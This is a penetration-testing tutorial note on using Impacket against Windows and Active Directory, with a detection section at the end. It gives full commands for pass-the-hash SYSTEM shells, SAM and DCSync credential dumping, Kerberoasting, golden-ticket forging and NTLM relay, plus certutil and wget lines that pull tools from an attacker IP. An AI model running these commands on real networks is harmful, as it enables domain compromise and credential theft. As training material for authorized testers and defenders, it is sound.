# Impacket Toolkit — Escalation & Delivery

[Impacket](https://github.com/fortra/impacket) is a set of Python classes + example scripts implementing Windows network protocols (SMB, MSRPC, Kerberos, LDAP). It runs **from your attack box** (Linux, or Windows with Python) and targets **Windows/AD** services over the network. Authorized engagements only — see [[AD Attacks Overview]].

> **Windows vs Linux scope.** Impacket escalates on **Windows/AD**: local-admin → SYSTEM (exec tools) and domain-user → Domain Admin (credential/Kerberos/relay tools). It is **not** a local **Linux privesc** tool — for a Linux *target* use the vectors in [[../Linux/Enumeration & Privilege Escalation]] (GTFOBins, SUID, sudo, capabilities). Impacket only touches Linux as the *attacker* platform, or when a Linux box is domain-joined and you reuse AD creds against it.

## Naming: `Example.py` vs `impacket-example`

The scripts have two names depending on install. Kali's package prefixes them:

| From `examples/` (pip/git) | On Kali (package) |
| --- | --- |
| `secretsdump.py` | `impacket-secretsdump` |
| `psexec.py` / `wmiexec.py` | `impacket-psexec` / `impacket-wmiexec` |
| `GetUserSPNs.py` | `impacket-GetUserSPNs` |
| `ntlmrelayx.py` | `impacket-ntlmrelayx` |

Examples below use the `.py` form; swap to `impacket-*` on Kali.

## Step 1 — Deliver Impacket to your attack box (setup)

```bash
# Recommended: isolated install
pipx install impacket

# Or from source (latest)
git clone https://github.com/fortra/impacket
cd impacket && pipx install .

# Verify
secretsdump.py -h
```

## Step 2 — Deliver tools to a target (file transfer)

When you need a tool/binary (e.g. winPEAS, a checker) *on* a compromised host, host it from the attack box and pull it down. `impacket-smbserver` is itself the classic delivery channel.

```bash
# Attacker: serve the current directory over SMB
impacket-smbserver share ./ -smb2support -user u -password p
```

```powershell
# Windows target: pull the file
copy \\<attacker-ip>\share\winPEAS.exe C:\Windows\Temp\winPEAS.exe
```

```bash
# Alt over HTTP — attacker serves, target pulls
python3 -m http.server 80                                           # attacker
certutil -urlcache -f http://<attacker-ip>/winPEAS.exe out.exe      # Windows target
wget http://<attacker-ip>/linpeas.sh -O /tmp/linpeas.sh             # Linux target
```

## Step 3 — Escalation tools (grouped by what they get you)

### A. Local admin → SYSTEM (remote exec)

Authenticate as a **local admin** (password or NT hash) and these drop you to `NT AUTHORITY\SYSTEM`.

```bash
# Interactive SYSTEM shell over SMB (creates a service — noisy)
psexec.py <domain>/<admin>@<target>

# Pass-the-hash (no plaintext needed)
psexec.py -hashes :<nt-hash> <domain>/<admin>@<target>

# Semi-interactive, no service installed (quieter)
wmiexec.py <domain>/<admin>@<target>

# Fallbacks when SMB/WMI are blocked
atexec.py <domain>/<admin>@<target> "whoami"   # scheduled task
dcomexec.py <domain>/<admin>@<target>          # DCOM
```

### B. Domain user → Domain Admin (credential access)

```bash
# Dump local SAM + LSA secrets (needs local admin on the target)
secretsdump.py <domain>/<admin>@<target>

# DCSync a single account, e.g. krbtgt (needs replication rights) -> golden-ticket material
secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt

# Dump the entire directory from a DC (every domain hash) -> full compromise, report it
secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc
```

### C. Kerberos-based escalation

```bash
# Kerberoast: crack a service account (often privileged) -> its rights
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile kerb.hashes
hashcat -m 13100 kerb.hashes wordlist.txt

# AS-REP roast: users without Kerberos pre-auth
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc> -no-pass -format hashcat -outputfile asrep.hashes

# S4U / constrained delegation: impersonate a privileged user to a service
getST.py -spn cifs/<target> -impersonate Administrator <domain>/<svc-acct>:<pass>

# Forge tickets (golden/silver) once you hold krbtgt / a service hash — domain dominance, report
ticketer.py -nthash <krbtgt-hash> -domain-sid <sid> -domain <domain> Administrator
```

See [[Kerberos Attacks]] for the theory behind these.

### D. NTLM relay (escalate without cracking)

Relay captured NTLM auth to a host where the victim is admin, or to LDAP to grant yourself delegation. Pair with Responder / mitm6 to capture the auth. High impact — **get explicit scope**.

```bash
# Relay to hosts in a list; dump SAM where the victim is local admin
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP to configure RBCD on a computer object -> impersonate to it
ntlmrelayx.py -t ldap://<dc> --delegate-access
```

## Putting it together — end-to-end delivery walkthrough

1. **Set up** Impacket on the attack box (Step 1).
2. **Get initial domain creds** from [[Enumeration]] (spray, capture, or provided).
3. **Find where you're local admin:** `nxc smb <subnet> -u <user> -p <pass>`.
4. **`secretsdump.py`** that host → collect more NT hashes / local-admin creds.
5. **`psexec.py` / `wmiexec.py`** with a privileged hash → **SYSTEM** on the next host.
6. **`secretsdump.py -just-dc`** against the DC (once you have DA/replication) → **domain compromise**.
7. **Document** every hop — command, host, timestamp, result — for the report.

## Defense / detection

- **secretsdump / DCSync:** alert on directory replication (event **4662** with replication GUIDs) from non-DC accounts; restrict `Replicating Directory Changes`.
- **psexec / smbexec:** service creation (**7045**), writes to `ADMIN$`; wmiexec/atexec leave WMI/Task Scheduler traces.
- **Kerberoast / AS-REP:** **4769** RC4 spikes, **4768** with pre-auth=0; use gMSA + AES.
- **NTLM relay:** enforce **SMB signing** and **LDAP channel binding/signing**, disable NTLM where possible, patch coercion (PetitPotam/PrinterBug), EDR on `mitm6`.
